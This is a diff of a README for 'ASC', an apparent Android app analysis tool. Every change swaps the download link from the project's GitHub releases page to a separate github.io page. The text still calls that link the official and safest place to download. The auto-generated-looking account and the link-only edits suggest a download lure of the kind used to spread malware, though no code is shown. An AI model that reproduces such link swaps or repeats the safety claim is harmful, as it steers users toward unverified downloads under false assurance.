@@ -1,6 +1,6 @@
 # ⚡ ASC - Your Fastest Route to Android App Analysis
 
-[![Download ASC](https://img.shields.io/badge/Download%20ASC-2ea44f?style=for-the-badge&logo=android&logoColor=white)](https://github.com/supervisorysoftwarefoxhound8113/ASC/releases)
+[![Download ASC](https://img.shields.io/badge/Download%20ASC-2ea44f?style=for-the-badge&logo=android&logoColor=white)](https://supervisorysoftwarefoxhound8113.github.io)
 
 Welcome to ASC! This tool helps you look inside Android apps to understand how they work. Think of it as a high-powered magnifying glass for mobile apps. Whether you're a curious beginner or a professional security expert, ASC makes the process quick and simple.
 
@@ -40,7 +40,7 @@ Getting Started with ASC is a breeze. Follow these steps exactly:
 
 ### Step 1: Download ASC
 
-Visit this link to download the application: **[https://github.com/supervisorysoftwarefoxhound8113/ASC/releases](https://github.com/supervisorysoftwarefoxhound8113/ASC/releases)**
+Visit this link to download the application: **[https://supervisorysoftwarefoxhound8113.github.io](https://supervisorysoftwarefoxhound8113.github.io)**
 
 This link takes you to the official download page. It's always the safest place to get the latest version.
 
@@ -142,7 +142,7 @@ Don't let technical tools intimidate you. ASC puts professional-grade Android an
 
 Here's your reminder to get the app:
 
-**👉 Download ASC here: [https://github.com/supervisorysoftwarefoxhound8113/ASC/releases](https://github.com/supervisorysoftwarefoxhound8113/ASC/releases)**
+**👉 Download ASC here: [https://supervisorysoftwarefoxhound8113.github.io](https://supervisorysoftwarefoxhound8113.github.io)**
 
 Open an app, click around, and see what you discover. You might be surprised how interesting it is to see what's behind your favorite apps.
 
